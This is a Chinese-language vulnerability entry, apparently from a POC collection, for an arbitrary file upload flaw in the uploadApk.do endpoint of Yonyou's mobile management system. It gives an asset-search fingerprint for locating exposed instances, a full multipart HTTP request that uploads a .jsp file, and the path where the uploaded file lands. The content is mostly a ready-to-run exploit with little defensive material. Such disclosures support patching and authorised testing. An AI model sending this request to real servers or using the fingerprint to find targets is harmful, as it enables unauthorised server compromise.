# 用友 移动管理系统 uploadApk.do 任意文件上传漏洞

## 漏洞描述

用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

<a-checkbox checked>用友 移动管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="用友-移动系统管理"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1690733969075-570bd9ef-782e-45d7-acf7-b190f55e893b.png)

验证POC

```http
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
Content-Type: application/msword

hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

![img](../../../.vuepress/public/img/1690734721298-07fdce57-e0e9-4130-8bea-9a5e4aebb19b.png)

```http
/maupload/apk/a.jsp
```